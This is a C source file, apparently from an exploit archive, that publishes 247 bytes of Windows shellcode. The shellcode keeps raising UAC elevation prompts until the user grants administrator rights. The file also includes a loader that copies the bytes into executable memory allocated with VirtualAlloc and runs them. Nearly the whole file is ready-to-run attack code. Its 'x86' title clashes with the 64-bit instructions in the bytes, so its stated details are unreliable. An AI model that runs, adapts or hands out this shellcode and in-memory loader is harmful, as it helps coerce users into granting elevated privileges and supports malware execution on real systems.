/*
 
# Win x86 - UAC Self Elevate Shellcode (247 bytes)
# Date: [14.12.2018]
# Author: [Ege Balcı]
# Tested on: [Win 7/10]
 
This shellcode rapidly creates a UAC elevation popup for the current process until it elevates. 
-----------------------------------------------------------------
 

*/
 
#include <windows.h>


unsigned char shellcode[] = {
  0xfc, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
  0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52,
  0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
  0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c,
  0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
  0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01,
  0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88,
  0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50,
  0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56,
  0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31,
  0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
  0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
  0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41,
  0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b,
  0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
  0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52,
  0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff,
  0xff, 0xff, 0x5d, 0x48, 0xb8, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c,
  0x00, 0x50, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6e, 0x74,
  0x50, 0x48, 0x8d, 0x4c, 0x24, 0x06, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07,
  0xff, 0xd5, 0x41, 0xba, 0x48, 0x5d, 0xd6, 0x11, 0xff, 0xd5, 0x48, 0x89,
  0xc1, 0xba, 0x11, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00,
  0x41, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x41, 0xba, 0x03, 0x36, 0x81, 0xc3,
  0xff, 0xd5, 0x48, 0x83, 0xc4, 0x70, 0xc3
};


int main(int argc, char const *argv[])
{
    char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(BUFFER, shellcode, sizeof(shellcode));
    (*(void(*)())BUFFER)(); 
	return 0;
}
